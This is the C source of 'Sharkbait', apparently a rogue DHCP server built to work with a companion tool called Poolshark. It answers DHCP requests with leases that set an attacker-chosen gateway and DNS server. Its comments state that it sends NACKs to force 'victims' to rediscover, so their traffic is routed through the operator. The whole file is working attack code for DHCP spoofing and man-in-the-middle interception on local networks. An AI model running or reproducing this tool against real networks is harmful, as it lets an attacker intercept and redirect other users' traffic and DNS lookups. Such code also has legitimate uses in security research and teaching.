#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "../common/net.h"
#include "../common/dhcp.h"

#define BUFFER_SIZE 65535

typedef struct Packet
{
    DHCP dhcp;
} __attribute__((packed)) Packet;

int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout);
int calc_base_ip(uint32_t *ip_addr, uint32_t *netmask, uint32_t *base_ip_out, char *ip_str_out);
int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *netmask_out);
int get_number_of_ips(uint32_t base_ip);
int parse_dhcp_options(Packet *p);
Packet *init_packet(Packet *client_request, uint32_t lease_ip);


volatile sig_atomic_t keep_running = 1;
uint32_t start_lease;
uint32_t base_ip;
uint32_t netmask;
uint32_t ip;
uint32_t recent_xid;
struct in_addr gateway_ip, nameserver_ip;


int main(int argc, char *argv[])
{

    if(getuid() != 0)
    {
        printf("Error: Sharkbait requires root\n");
        return 1;
    }

    char *nameserver = NULL;
    char *gateway = NULL;
    char *interface = NULL;
    int opt;

    while((opt = getopt(argc, argv, "g:n:i:h")) != -1)
    {
        switch(opt)
        {
            case 'h':
                printf("Placeholder\n");
                return 0;
            case 'i':
                interface = optarg;
                break;
            case 'n':
                nameserver = optarg;
                break;
            case 'g':
                gateway = optarg;
                break;
        }
    }

    if(!interface)
    {
        printf("Error: -i <interface> is required.\n");
        return 1;
    }

    if(!nameserver || !gateway)
    {
        printf("Error: Need both flags [-g/-n]\n");
        return 1;
    }

    inet_pton(AF_INET, gateway, &gateway_ip);
    inet_pton(AF_INET, nameserver, &nameserver_ip);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(67);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    int enable_broadcast = 1;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if(sock < 0)
    {
        perror("socket SOCK_DGRAM");
        return 1;
    }
    
    if(setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &enable_broadcast, sizeof(enable_broadcast)) < 0)
    {
        perror("setsockopt SO_BROADCAST");
        close(sock);
        return 1;
    }

    char iface_ip_str[INET_ADDRSTRLEN];
    char iface_netmask_str[INET_ADDRSTRLEN];
    char iface_base_ip[INET_ADDRSTRLEN];


    get_iface_ip(sock, interface, &ip, iface_ip_str);
    get_iface_netmask(sock, interface, &netmask, iface_netmask_str);
    calc_base_ip(&ip, &netmask, &base_ip, iface_base_ip);

    int n = get_number_of_ips(netmask);

    inet_ntop(AF_INET, &base_ip, iface_base_ip, INET_ADDRSTRLEN);

    printf("Interface: %s\n", interface);
    printf("IP Address: %s\n", iface_ip_str);
    printf("Netmask: %s\n", iface_netmask_str);
    printf("Base Net: %s\n", iface_base_ip);
    printf("Number of IP's: %d\n", n);

    memcpy(&start_lease, &base_ip, sizeof(uint32_t));
    start_lease = ntohl(start_lease);
    start_lease = start_lease + 1;

    int result = bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    if(result == -1)
    {
        perror("socket bind");
        return 1;
    }

    printf("listening for DHCP requests...\n");

    char buffer[BUFFER_SIZE];

    struct sockaddr_in client;
    socklen_t len = sizeof(client);

    int lease_index = 0;

    while(keep_running)
    {   

        int bytes_recv = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&client, &len);
        printf("receieved data\n");
        if(bytes_recv < 0)
        {
            perror("recvfrom");
            return 1;
        }

        if(bytes_recv < sizeof(Packet))
        {
            continue;
        }

        Packet *p = (Packet *)buffer;

        if(p->dhcp.opcode != 0x01)
        {
            continue;
        }

        uint32_t xid;
        memcpy(&xid, &p->dhcp.transaction_id, 4);
        xid = ntohl(xid);
        if((xid >> 16) == MAGIC_TAG)
        {
            printf("Received a packet likely from Poolshark, discarding.\n");
            continue;
        }

        printf("Client (xid: %02x%02x%02x%02x) [%02X:%02X:%02X:%02X:%02X:%02X] requested an IP address.\n",
            p->dhcp.transaction_id[0],
            p->dhcp.transaction_id[1],
            p->dhcp.transaction_id[2],
            p->dhcp.transaction_id[3],
            p->dhcp.client_mac[0], 
            p->dhcp.client_mac[1], 
            p->dhcp.client_mac[2], 
            p->dhcp.client_mac[3], 
            p->dhcp.client_mac[4], 
            p->dhcp.client_mac[5]
        );

        Packet *response = NULL;

        int msg_type = parse_dhcp_options(p);

        if(msg_type == -1)
        {
            continue;
        }

        client.sin_addr.s_addr = htonl(INADDR_BROADCAST);
        client.sin_port = htons(68);

        printf("Creating offer.\n");

        if(msg_type == 1)
        {
            printf("Message type: DHCPDISCOVER\n");

            response = init_packet(p, htonl(start_lease));
            memcpy(&recent_xid, &response->dhcp.transaction_id, 4);

            int offset = 0;
            uint32_t lease_time = htonl(86400);

            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){2});
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, &ip);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
            response->dhcp.options[offset++] = DHCP_OPTION_END;

        }
        else if(msg_type == 2)
        {

            if(memcmp(p->dhcp.transaction_id, &recent_xid, sizeof(recent_xid)) != 0 && lease_index == 0)
            {
                // Send NACK for any DHCPREQUEST
                // This will force victims to send a DHCPDISCOVER

                printf("Message type: DHCPREQUEST\n");
                printf("Sending NACK\n");

                // Init base DHCP struct
                response = init_packet(p, htonl(start_lease));

                // Add DHCP options for a NACK
                int offset = 0;
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){DHCP_NAK});
                response->dhcp.options[offset++] = DHCP_OPTION_END;
            }
            else
            {
                printf("Message type: DHCPREQUEST\n");
                printf("Sending ACK\n");


                response = init_packet(p, htonl(start_lease));
                start_lease = start_lease + 1;

                int offset = 0;
                uint32_t lease_time = htonl(86400);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){5});
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
                response->dhcp.options[offset++] = DHCP_OPTION_END;
            }
        }
        else
        {
            continue;
        }

        int sent_bytes = sendto(sock, response, sizeof(*response), 0, (struct sockaddr *)&client, len);

        if(sent_bytes < 0)
        {
            perror("sendto");
            free(response);
            return 1;
        }

        free(response);

        printf("Sent %d bytes to [%02X:%02X:%02X:%02X:%02X:%02X]\n", 
            sent_bytes,
            p->dhcp.client_mac[0],
            p->dhcp.client_mac[1],
            p->dhcp.client_mac[2],
            p->dhcp.client_mac[3],
            p->dhcp.client_mac[4],
            p->dhcp.client_mac[5]

        );

    }
    return 0;
}

int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl SIOCGIFADDR");
        return 1;
    }

    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_addr;
    inet_ntop(AF_INET, &sa->sin_addr, ipout, INET_ADDRSTRLEN);
    memcpy(ip, &sa->sin_addr, sizeof(sa->sin_addr));

    return 0;
}


int calc_base_ip(uint32_t *ip_addr, uint32_t *netmask, uint32_t *base_ip_out, char *ip_str_out)
{
    uint32_t base = *ip_addr & *netmask;
    *base_ip_out = base;
    inet_ntop(AF_INET, &base, ip_str_out, INET_ADDRSTRLEN);
    return 0;

}

int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *netmask_out)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
    {
        perror("ioctl SIOCGIFNETMASK");
        return 1;
    }

    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_netmask;
    inet_ntop(AF_INET, &sa->sin_addr.s_addr, netmask_out, INET_ADDRSTRLEN);
    memcpy(netmask, &sa->sin_addr.s_addr, sizeof(sa->sin_addr));

    return 0;
}

int get_number_of_ips(uint32_t netmask)
{
    int cidr = cidr_from_netmask(netmask);
    int n = (1 << (32 - cidr)) - 2;

    return n;
}

int parse_dhcp_options(Packet *p)
{
    int len = sizeof(p->dhcp.options);
    int i = 0;

    if(len <= 0)
    {
        printf("Error: DCHP Options should not be NULL.\n");
        return -1;
    }

    while(i < len)
    {
        if(p->dhcp.options[i] == DHCP_OPTION_END)
        {
            return -1;
        }

        if(p->dhcp.options[i] == DHCP_OPTION_REQUESTED_IP)
        {
            uint32_t requested_ip = p->dhcp.options[i + 2];
            return 1;
        }

        if(p->dhcp.options[i] == DHCP_OPTION_MESSAGE_TYPE)
        {
            int msg = p->dhcp.options[i + 2];

            switch(msg)
            {
                case 0x01:
                    return 1;
                case 0x03:
                    return 2;
            }
        }
        i += 2 + p->dhcp.options[i + 1];
    }
    return -1;
}


Packet *init_packet(Packet *client_request, uint32_t lease_ip)
{
    // Allocate the packet in memory
    Packet *p = malloc(sizeof(Packet));
    if(!p)
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // Zero out Packet struct
    memset(p, 0, sizeof(Packet));

    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));

    // Build the basic DHCP structure
    p->dhcp.opcode = 0x02;
    p->dhcp.hw_type = 0x01;
    p->dhcp.hw_len = 0x06;
    memcpy(p->dhcp.transaction_id, &client_request->dhcp.transaction_id, sizeof(p->dhcp.transaction_id));
    memcpy(p->dhcp.flags, &client_request->dhcp.flags, sizeof(p->dhcp.flags));
    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));
    memcpy(p->dhcp.client_mac, &client_request->dhcp.client_mac, sizeof(p->dhcp.client_mac));
    memcpy(&recent_xid, &client_request->dhcp.transaction_id, 4);
    set_dhcp_magic_cookie(p->dhcp.magic_cookie);

    return p;
}